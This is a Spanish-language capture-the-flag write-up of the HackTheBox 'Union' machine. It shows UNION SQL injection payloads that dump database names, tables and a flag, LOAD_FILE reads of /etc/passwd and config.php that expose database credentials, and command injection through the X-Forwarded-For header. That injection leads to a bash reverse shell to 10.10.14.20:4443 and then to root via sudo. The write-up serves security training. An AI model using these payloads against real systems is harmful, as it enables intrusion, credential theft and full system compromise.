+++ 
draft = false
date = 2025-12-26T21:03:38Z
title = "Union Machine - HackTheBox"
description = "Union es una máquina de dificultad media de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Machine #Linux #Medium #SQLI
----------------
# Enumeración Nmap

Realizamos un escaneo de los puertos, encontrando como resultado el puerto `80` abierto, que está corriendo el servicio `HTTP`

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.233 -oG allPorts
```

<img src="/images/Pasted image 20251226152119.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración puerto 80

Viendo la página en el puerto 80, tenemos que podemos verificar `players` para ver si son elegibles para participar en algún torneo

<img src="/images/Pasted image 20251226152243.png" style="width:100%; height:auto; display:block; margin:auto;">

Si ponemos algún valor, aparece un mensaje, y un apartado para ir a `http:10.10.11.128/challenge.php`

<img src="/images/Pasted image 20251226152400.png" style="width:100%; height:auto; display:block; margin:auto;">

Yendo a `challenge.php` encontramos algo similar a la página anterior, solo que se nos pide una `flag`

<img src="/images/Pasted image 20251226152507.png" style="width:100%; height:auto; display:block; margin:auto;">

# SQLinjection

Interceptando la petición de la página principal en `burpsuite`, probamos inyecciones sql básicas, teniendo éxito en la `Union injection` con el siguiente payload

```bash
celero0' UNION SELECT 1;--+-
```

<img src="/images/Pasted image 20251226153043.png" style="width:100%; height:auto; display:block; margin:auto;">

## Viendo las bases de datos

Podemos ver que solo tiene una columna la consulta, por lo tanto procederemos a investigar por las bases de datos

```bash
celero0' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;-- -
```

Teniendo como resultado las siguientes bases de datos `mysql,information_schema,performance_schema,sys,november`, la que parece más interesante es la última, `november`.

## Viendo las tablas

Para ver las tablas de la base de datos `november`, tenemos el siguiente payload

```bash
celero0' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='november';-- -
```

El cual como resultado nos arroja que existe las tablas `flag` y `players`

<img src="/images/Pasted image 20251226154541.png" style="width:100%; height:auto; display:block; margin:auto;">

## Viendo las columnas

Para ver el nombre de la columna de la tabla `flag` tenemos el siguiente payload

```bash
celero0' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag';-- -
```

Mostrando que existe solo una columna llamada `one`

<img src="/images/Pasted image 20251226155306.png" style="width:100%; height:auto; display:block; margin:auto;">

## Viendo los valores de la columna

Para ver los valores de la columna `one` tenemos el siguiente payload

```bash
celero0' UNION SELECT GROUP_CONCAT(one) FROM november.flag;--+-
```

Que nos muestra como valor una flag `UHC{F1rst_5tep_2_Qualify}`

<img src="/images/Pasted image 20251226155629.png" style="width:100%; height:auto; display:block; margin:auto;">

Insertamos la flag en `/challenge.php` y tenemos el siguiente mensaje

Primero nos redirige hacia `/firewall.php`, y nos aparece el mensaje que ahora podemos acceder a `SSH`

<img src="/images/Pasted image 20251226172148.png" style="width:100%; height:auto; display:block; margin:auto;">

Escaneando por el puerto 22, vemos que ahora el puerto `SSH` está abierto pero no tenemos credenciales válidas

<img src="/images/Pasted image 20251226172241.png" style="width:100%; height:auto; display:block; margin:auto;">


## Read files con SQLI

Como no tenemos credenciales válidas para conectarnos por `SSH` procedemos a intentar leer archivos mediante SQLI

Para cargar archivos locales desde SQL tenemos la siguiente forma

```bash
SELECT LOAD_FILE('/etc/passwd');
```

adaptándolo a nuestro payload quedaría así

```bash
celero0' UNION SELECT LOAD_FILE('/etc/passwd');--+-
```

Tenemos como resultado el siguiente, el cual demuestra que tenemos capacidad de listado de archivos

<img src="/images/Pasted image 20251226172645.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto procedemos a intentar leer el archivo `config.php`, que por defecto se podría encontrar en `/var/www/html/config.php`

Encontramos las credenciales de la base de datos: `uhc:uhc-11qual-global-pw`

<img src="/images/Pasted image 20251226172904.png" style="width:100%; height:auto; display:block; margin:auto;">

# Acceso a la máquina

Probamos si es que se reutilizan las credenciales de la base de datos en `SSH`, y obtenemos acceso a la máquina, y encontramos la flag de usuario

<img src="/images/Pasted image 20251226173316.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Viendo los archivos `.php` en el directorio `/var/www/html` tenemos el archivo
`firewall.php`, el cual es el siguiente

<img src="/images/Pasted image 20251226173510.png" style="width:100%; height:auto; display:block; margin:auto;">

La parte importante se concentra acá, el script verifica si existe la cabecera `HTTP_X_FORWARDED_FOR`, si existe ejecuta `iptables` con privilegios sudo
tomando como valor la `IP` que aparece en `HTTP_X_FORWARDED_FOR`.

```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>

```

## Explotando script mal configurado

Por lo tanto nos podemos aprovechar de la mala configuración para ejecutar un comando arbitrario, para probar si es vulnerable haremos lo siguiente

```bash
X-FORWARDED-FOR: 10.10.10.10;ping 10.10.14.20;
```

<img src="/images/Pasted image 20251226175349.png" style="width:100%; height:auto; display:block; margin:auto;">

y verificamos las trazas `ICMP` con `tcpdump` de la siguiente forma

```bash
tcpdump -i tun0 icmp
```

y tenemos respuestas, por lo tanto se ejecuta el RCE

<img src="/images/Pasted image 20251226175317.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto ahora procedemos a enviarnos una consola inversa, el payload será el siguiente

```bash
X-FORWARDED-FOR:;bash -c 'bash -i >& /dev/tcp/10.10.14.20/4443 0>&1';
```

<img src="/images/Pasted image 20251226175547.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos ponemos en escucha con `nc` de la siguiente forma

```bash
nc -nlvp 4443
```

y obtenemos la shell, con el usuario `www-data`

<img src="/images/Pasted image 20251226175616.png" style="width:100%; height:auto; display:block; margin:auto;">

Procedemos a ver los permisos `sudo` que tiene, y vemos que podemos ejecutar `sudo`, sin proporcionar contraseña y con cualquier argumento

<img src="/images/Pasted image 20251226175653.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto nos convertiremos en el usuario `root` con el comando `sudo su` y procederemos a leer la flag de `/root/root.txt`

<img src="/images/Pasted image 20251226175751.png" style="width:100%; height:auto; display:block; margin:auto;">

Comprometiendo totalmente el sistema.
